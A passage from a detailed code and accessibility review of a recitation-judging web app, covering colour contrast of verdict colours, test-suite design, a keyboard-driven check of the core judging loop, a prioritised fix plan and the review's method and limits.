degrades, and here it is marginally *better* than light.

This is worth stating plainly next to §3.1. The type scale and the radius scale
drifted badly; the colour system did not. That is evidence the tokens work when
they are used, and it strengthens §3.1's argument — the fix there is a
mechanical guard, not a redesign, because the palette underneath is sound.

*Caveats, stated so the number is not read as more than it is:* the judging
figure covers 21 runs rather than 254 because the Mushaf itself failed to render
during measurement (§1.1), so Quranic glyph contrast is **not** included here and
remains unmeasured. Non-text contrast is measured separately in §3.9, and unlike
text it does not come out clean.

*A note on method, because the first run of this measurement was wrong.* The
initial pass reported 3 failures on judging and 10 on Results, the worst at
1.2:1. All of them were artefacts. `color-mix()` resolves through
`getComputedStyle` as `color(srgb 0.984 0.980 0.969 / 0.88)`, and a naive
`/[\d.]+/` parse reads those 0–1 floats as 0–255 channels — turning near-white
into near-black and manufacturing failures. Anyone re-running a contrast audit
on this codebase has to handle the `color(srgb …)` form; the corrected pass also
asserts that no colour string went unparsed, so a zero means measured rather
than skipped.

### 3.9 One criterion colour misses the standard the codebase itself writes down

§3.8 covers text. This is the other half — rule 3 makes colour a verdict, so the
criterion and status colours are load-bearing graphical indicators and WCAG
1.4.11 asks 3:1 of them.

The standard is already stated in the source, at `global.css:154`:

> *"A chosen chip is filled with `--c` and lettered in `--surface`, so `--c` has
> to carry white. `#2e9e83` sat at OKLCH L 63, where white measures 3.32:1 and
> fails AA — and there is a dead band around L 56–58 where neither white nor ink
> clears 4.5:1, so the fix is to go darker rather than to tune the hue. `#377b60`
> is L 53 on the same hue: white at 5.04:1, and it still clears the 3:1 a filled
> chip needs against both the light and the dark surface."*

That is exactly the right analysis. Computing the same figure independently gives
adu-raagu **5.04:1 against white** — matching the comment to the decimal, which
is a useful check that the numbers below use the same method.

Applying it to all four criterion colours, against the app's *actual* surface
tokens rather than white:

| | `--bg` `#f2f1ee` | `--page-paper` `#fbfaf7` | `--surface` `#ffffff` |
| --- | --- | --- | --- |
| jali `#d8453d` | 3.84 | 4.16 | 4.34 |
| **khafi `#c0892a`** | **2.71 ✗** | **2.94 ✗** | 3.06 |
| fasaha `#5566e6` | 4.20 | 4.54 | 4.74 |
| adu-raagu `#377b60` | 4.46 | 4.83 | 5.04 |

**Khafī fails 3:1 on both surfaces the app actually paints**, and clears it only
against pure white — which the app uses for `--surface` but not for the page
behind the Mushaf or the app background. The likely explanation is visible in the
comment itself: the analysis was done against white, and `--bg` `#f2f1ee` and
`--page-paper` `#fbfaf7` are darker than the reference it was checked against.

The fix is the move the comment already prescribes for the same problem — go
darker rather than tune the hue. Khafī needs roughly OKLCH L 3–4 points lower to
clear 3:1 on `#f2f1ee`.

**A second observation, which is not a defect but constrains future changes.**
The four criterion colours are near-identical in *luminance*:

```
jali vs fasaha     1.09:1      needs-review vs ready      1.15:1
fasaha vs adu      1.06:1      needs-review vs finalized  1.10:1
jali vs adu        1.16:1      ready vs finalized         1.05:1
jali vs khafi      1.42:1
khafi vs fasaha    1.55:1      khafi vs adu               1.65:1
```

They are separated by hue alone. Desaturated — greyscale printing, or a viewer
with red-green colour vision deficiency — jali, fasaha and adu-raagu are within
1.16:1 of each other, which is indistinguishable. This is fine *as long as* every
verdict is dual-coded, and the status colours are: the ledger renders the words
*Needs review* / *Ready* / *Finalized* next to the colour. The rule to write down
is that colour may never be the sole carrier of a verdict, because these
particular colours cannot survive being the sole carrier.

**Fix:** darken khafī, and add a colour-contract test in the existing
`scripts/*.test.mjs` style that asserts every criterion and status colour clears
3:1 against `--bg`, `--page-paper` and `--surface` in both themes. The repo
already proves it will write and keep tests like this; the reason khafī drifted
is that the reasoning lived in a comment instead of an assertion. Pair it with
§3.1's stylelint guard — same category of fix, same reason.

---

## 4. Severity 4 — tests and process

### 4.1 42% of assertions test how the code is written, not what it does

| | |
| --- | --- |
| Total assertions | 1,647 |
| `assert.match` + `assert.doesNotMatch` (regex over source text) | **697 (42%)** |
| Test files that `readFileSync` application source | **22 of 30** |

These pin implementation strings — class names, JSX fragments, literal copy.
They break on any refactor that preserves behaviour, and they pass on any change
that breaks behaviour while keeping the string. During earlier work here, a
redesign that was functionally correct failed tests solely because
`results-status-card` had become `results-row`.

They are not worthless — they are cheap regression guards for a UI with no
component-test harness — but they are the wrong tool for 42% of the suite.

**Fix:** add a real component test runner (Vitest + Testing Library) and migrate
the source-text assertions to behavioural ones — render the component, assert on
roles and text the user sees. Keep source-text assertions only for genuine
invariants that have no runtime surface (e.g. "no `window.prompt` anywhere").

### 4.2 No end-to-end or visual coverage

There is no test that boots the app and judges a recitation. Every severity-1
finding in §1 would have been caught by one smoke test that loads the app with
the font CDN blocked and asserts the Mushaf renders.

**Fix:** a small Playwright suite (Chromium is already available in CI images
here) covering: app boots → sample competition loads → Mushaf renders → mark a
mistake → finish → result appears in Review → export produces a workbook. Run it
with the CDN blocked as a second matrix entry.

### 4.3 What is already good, and should not be lost

- **Zero** `TODO`/`FIXME`/`HACK` markers in 22,390 lines of TS/TSX.
- No `dangerouslySetInnerHTML` or `innerHTML` anywhere.
- The migration/backup discipline is thoughtful (§1.3 is about pruning, not
  about the idea).
- `DESIGN_GRAMMAR.md` and the `docs/*-study.html` convention are a genuinely
  unusual asset — measured design decisions with their evidence attached.
- The domain model (judge sections, revisions, `fnv1a` manifests, ledger events,
  question evidence) is serious work.
- **The core judging loop is keyboard-operable end to end, and it is good.**
  See §4.4 — this deserves its own section rather than a bullet.

### 4.4 The core loop, driven end to end — and it holds

Everything else in this review examines code. This section reports what happened
when the application's central action was actually performed, by keyboard, with
real key and mouse events, and then interrupted.

**The keyboard path exists and is complete.** Each of the 126 words on a rendered
page carries an overlaid hit target — not the visible `<span>`, which is why a
first pass looking at `.m-word` wrongly concluded the Mushaf was mouse-only:

```jsx
<div data-word-hit={box.wid} role="button" tabIndex={0}
     onKeyDown={(event) => openPinnedForBox(event, box)}
     aria-label={mistakes.length
       ? `${box.semanticText}, ${mistakes.length} mark(s)`
       : `Select word ${box.semanticText}`} />
```

Driving it: focus a hit box (`aria-label: "Select word إِن"`) → **Enter** opens
the mark menu *pinned*, and **focus moves into it** (`focusInMenu: true`) →
the menu offers the word's letter units and the criterion action →
select the unit ء → activate **Mark Jalī−2**. Result:

```
events   : ["session_started", "mistake_added"]
mistake  : { category: "jali", amount: 2, label: "86:4 · letter 1" }
```

A judge with no mouse can record a letter-exact deduction. In an app whose
primary interaction is a press-and-slide gesture, that is not a given, and
`DragMenu.tsx:112` shows it was deliberate: *"When the menu is pinned (tap
path), move focus into it for keyboard users."*

**The commit is properly gated, not silently dropped.** Activating **Mark**
before choosing a letter unit does nothing — and the reason is the right one:

```
Mark button, no unit selected → { disabled: true, ariaDisabled: "true" }
```

Both the property and the ARIA attribute. `Mushaf.tsx:526` also carries an
`if (!unit) return;` behind it, so the guard is doubled. This is the opposite of
the failure-discipline problem in §1 — here an impossible action is prevented
*and* announced.

**It survives being killed.** With one real mark in the ledger, a hard reload —
the browser tab dying mid-recitation, the case that actually happens in a
competition hall:

```
before reload : { mistakes: 1, events: ["session_started","mistake_added"],
                  label: "86:4 · letter 1" }
after  reload : { mistakes: 1, events: ["session_started","mistake_added"],
                  label: "86:4 · letter 1" }        ← byte-identical
```

The session stays live, the mark is intact, and it re-renders on the page. The
event-sourced state plus per-dispatch persistence (§2.2 criticises its *cost*,
not its correctness) does exactly what it was built to do.

**Two things follow for §4.2's missing end-to-end suite.**

First, the recipe above *is* the test. `focus a .word-hit → Enter → click unit →
click Mark → assert one mistake_added → reload → assert identical` is a complete
smoke test of the application's reason to exist, and it needs no new test
infrastructure beyond a browser driver. The reason there is no end-to-end
coverage is not that the app is untestable.

Second, one caution learned the hard way while doing this. Synthesised
`PointerEvent`s — including with `pointerId`, `pointerType: "touch"` and correct
capture semantics — did **not** commit a mark, across three attempts. The
keyboard path did, first try. Any end-to-end suite here should drive the
keyboard route rather than trying to reproduce the slide gesture, which is both
more robust and tests the accessibility path for free.

*The one thing this section does not establish:* it ran against a dev server
with §1.1 temporarily patched so the Mushaf would render at all, and that patch
was reverted immediately afterwards. Without it there are no words to focus and
the loop cannot start — which is one more measure of how much §1.1 costs.

---

## 5. Suggested order

Sequenced by risk retired per hour spent, and grouped so each phase is a
decision someone can actually make.

**Phase 1 — before the next competition.** A day's work between them, and the
difference between "a good app" and "an app you would trust with an official
competition."

| # | Change | Size | Retires |
| --- | --- | --- | --- |
| 1 | `.catch(() => false)` on the font promise (§1.1) | 1 line | Total loss of the judging screen offline |
| 2 | `escapeCell()` at every workbook boundary (§1.4) | ~20 lines + test | A live vulnerability against a documented requirement |
| 3 | Error boundaries around stage and views (§1.5) | ~60 lines | White-screen-mid-competition |
| 4 | Surface failed saves (§1.2) | ~40 lines | Silent loss of a judge's work |
| 5 | Prune migration backups (§1.3, part 1) | ~20 lines | 90% of storage pressure |
| 6 | Replace `window.prompt` (§1.6) | ~40 lines | Unfinalizable revisions in WebViews |
| 7 | Bound the roster import — size, rows, field length (§1.7) | ~10 lines | Unbounded state from an ordinary bad spreadsheet |
| 8 | Flip the impression default; add `marked` to the finalized record (§1.8) | ~15 lines + test | A 10-mark swing decided by a default argument, unrecordable once finalized |
| 9 | Precache the local Uthmani face; name offline in the error (§1.1) | ~15 lines | Judging 0 of 604 pages offline |

**Phase 2 — small, high-leverage, mostly mechanical.** Each is under an hour and
none requires a design decision.

| # | Change | Size | Retires |
| --- | --- | --- | --- |
| 10 | Key touch sizing off `(pointer: coarse)`, not width (§3.7) | ~4 lines, net smaller | 44px targets on every tablet — the likeliest judging device |
| 11 | Darken khafī; colour-contract test against the real surface tokens (§3.9) | ~1 line + test | A verdict colour below 3:1 on every surface the app paints |
| 12 | Derive the SW cache version from the asset hashes (§2.6) | ~10 lines | Dead cache on judges' devices, and a test that discourages the fix |
| 13 | Security headers in the Worker; CSP naming the one external origin (§2.7) | ~15 lines | Defence-in-depth, plus executable documentation of §1.1's dependency |
| 14 | Delete three destructive dead actions (§2.8) | net negative | Unguarded destructive actions waiting for their first caller |

**Phase 3 — structural, worth planning.** These change how the code is shaped,
so they want a decision rather than a spare afternoon.

| # | Change | Size | Retires |
| --- | --- | --- | --- |
| 15 | One `<Modal>` wrapper for the seven hand-rolled dialogs (§3.6) | ~60 lines, 7 call sites | Keyboard users stranded in every modal on the recitation path |
| 16 | Hoist the reducer guards into shared preconditions (§2.8) | ~40 lines | Correctness that depends on a JSX condition rather than the reducer |
| 17 | Tests for the reducer guards (§2.8) | ~1 hour | The best-reasoned logic in the codebase is the least covered |
| 18 | Stylelint guard + one conversion pass (§3.1) | mechanical | Permanent type-scale and radius drift |
| 19 | Drop one spreadsheet library (§2.3) | dependency work | ~385 kB gzipped |
| 20 | Split the context, debounce persistence (§2.1, §2.2) | moderate | Frame drops at real roster sizes |
| 21 | Playwright smoke suite — recipe in §4.4 (§4.2) | moderate | The whole class of §1 defects |
| 22 | IndexedDB for the live record (§1.3, part 2) | large | The 5 MB ceiling |
| 23 | Migrate source-text assertions (§4.1) | large, incremental | A test suite that blocks refactoring |

**One theme runs through phase 2 and 3.** Items 11, 12, 17 and 18 are the same
fix wearing four hats: a rule the codebase already knows — written in a comment,
a design document, or a careful reducer case — that nothing asserts. Every one
of them drifted for the same reason, and every one is fixed by turning the
reasoning into a test.

---

## 6. Method, and what this review does not cover

**Method.** Working tree pinned byte-identical to `main`; 309 tests and a clean
build established as the baseline first, and re-run at the end. Static
measurements by script over the real source. Runtime measurements by driving the
app in headless Chromium over CDP: storage sizes, per-dispatch timing,
hit-target geometry across four emulated viewports, the accessibility tree,
composited colour sampled from live `getComputedStyle`, keyboard behaviour driven
through real `Input.dispatchKeyEvent` presses rather than synthetic events, and
offline behaviour through `Network.emulateNetworkConditions` against a production
build with the service worker installed and activated.

Three findings were reproduced with working proofs — the font-CDN failure (§1.1),
the formula injection (§1.4), and the scoring default (§1.8, run against the real
`DEFAULT_CONFIG`). One fix was applied and verified before being reverted: §1.1's
one-liner took the Mushaf from 1 rendered node to 12. Nothing from this review is
left in the tree.

**Two measurements in this review were wrong before they were right**, and both
are documented where they occur rather than quietly corrected: a synthetic
`Escape` event that could never have reached a React handler and so proved
nothing (§3.6), and a colour parser that read `color(srgb 0.98 …)` floats as
0–255 channels and manufactured 13 contrast failures including a bogus 1.2:1
(§3.8). Both were caught by checking a result that looked too dramatic. Any
re-run of these audits needs to handle both.

**Not covered, and why:**

- **Server-side.** Nearly none, and now covered rather than skipped: the whole
  of it is `worker/index.js`, 21 lines of SPA fallback over Cloudflare's
  `ASSETS` binding, reviewed in §2.7. Everything else that "backend" usually
  means — the state store, persistence, the service worker and the export
  pipeline — lives in the client and is covered by §1, §2.2 and §2.6.
- **Quranic glyph contrast.** §3.8 measures 550 text runs, but none of them are
  Mushaf glyphs — the page failed to render during measurement (§1.1). Worth
  re-running once §1.1 is fixed.
- **Cross-browser.** Everything was measured in Chromium. Safari's localStorage
  behaviour under memory pressure is materially different and matters for iPad
  judging.
- **Real-device touch testing.** Hit targets were measured geometrically across
  four emulated viewports with touch emulation on (§3.7), not used with a thumb.
  The geometry is conclusive; how 40px feels mid-recitation is not.
- **The Arabic typography itself.** Whether the QCF fallback preserves correct
  Uthmani orthography at every page is a question for someone qualified to judge
  it; §1.1 only establishes that the fallback renders.
